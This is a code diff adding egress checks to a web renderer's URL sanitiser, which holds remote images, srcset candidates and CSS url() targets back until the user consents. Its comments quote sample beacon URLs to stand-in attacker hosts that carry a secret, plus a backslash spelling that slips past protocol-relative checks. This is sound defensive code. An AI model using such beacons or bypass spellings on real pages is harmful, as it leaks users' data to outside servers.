@@ -43,6 +43,77 @@ export function isSafeUrl(value: string): boolean {
   return SAFE_URL_SCHEMES.has(scheme[1].toLowerCase() + ':');
 }
 
+/**
+ * Whether a URL makes the browser talk to a host other than the one serving
+ * the page — the question `isSafeUrl` does not ask.
+ *
+ * `isSafeUrl` judges the scheme: `https://attacker.example/beacon?secret=1` is
+ * a perfectly safe scheme and it is also a GET to somebody else's server, so a
+ * bundle's own markup reached the network on first paint with no capability
+ * involved. Answering "is this egress" separately is what lets the renderer
+ * hold remote sources back while the consent bar is unanswered and let them
+ * through once the user allows.
+ *
+ * Backslashes are folded to slashes before the protocol-relative test. The URL
+ * parser does the same for the http(s) base a bundle runs under, so `\\host/x`
+ * and `/\host/x` both resolve to `http://host/x` — a protocol-relative URL
+ * spelled so that a leading-`//` check misses it.
+ *
+ * A same-origin absolute URL (`https://this-host/x`) answers true as well.
+ * Withholding it costs nothing: it loads the moment the user allows, and the
+ * alternative is comparing against an origin this module cannot see.
+ */
+export function isRemoteUrl(value: string): boolean {
+  const probe = value.replace(URL_IGNORED, '').replace(/\\/g, '/');
+  if (probe.startsWith('//')) return true; // protocol-relative
+  const scheme = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(probe);
+  if (!scheme) return false; // relative, fragment, or query — this origin
+  return REMOTE_URL_SCHEMES.has(scheme[1].toLowerCase());
+}
+
+/**
+ * Schemes that name a host to connect to. `data:` and `blob:` are excluded on
+ * purpose: they carry their bytes with them, and `asset()` hands bundle files
+ * out as `blob:`, so treating them as egress would break every bundle's own
+ * sounds and images for no gain.
+ */
+const REMOTE_URL_SCHEMES = new Set(['http', 'https', 'ftp', 'ftps', 'ws', 'wss']);
+
+/**
+ * True if any candidate in a `srcset` is remote.
+ *
+ * `srcset` is a comma-separated list — `a.png 1x, https://host/b.png 2x` — so
+ * asking `isRemoteUrl` about the whole string answers about the first URL and
+ * the browser fetches whichever one it prefers.
+ */
+export function hasRemoteSrcSetCandidate(value: string): boolean {
+  return value
+    .split(',')
+    .some((candidate) => isRemoteUrl(candidate.trim().split(/\s+/)[0] ?? ''));
+}
+
+/**
+ * Rewrite `url(...)` targets a predicate rejects, leaving the rest of the CSS
+ * alone.
+ *
+ * Quoted and unquoted forms are matched separately. A single pattern with
+ * `[^)]*` cannot cross a literal `)`, so a URL that contains one inside its
+ * quotes — `url("https://evil.test/beacon?a=(b)")`, a perfectly ordinary query
+ * string — failed to match and the declaration reached the page untouched.
+ */
+export function rewriteCssUrls(css: string, isBlocked: (target: string) => boolean): string {
+  let out = css;
+  const strip = (pattern: RegExp): void => {
+    out = out.replace(pattern, (match, inner: string) =>
+      isBlocked(inner) ? 'url(/* removed */)' : match
+    );
+  };
+  strip(/url\s*\(\s*"([^"]*)"\s*\)/gi);
+  strip(/url\s*\(\s*'([^']*)'\s*\)/gi);
+  strip(/url\s*\(\s*([^)'"]*?)\s*\)/gi);
+  return out;
+}
+
 /** Attributes whose value the browser will fetch or navigate to. */
 export const URL_ATTRIBUTES = new Set([
   'href',
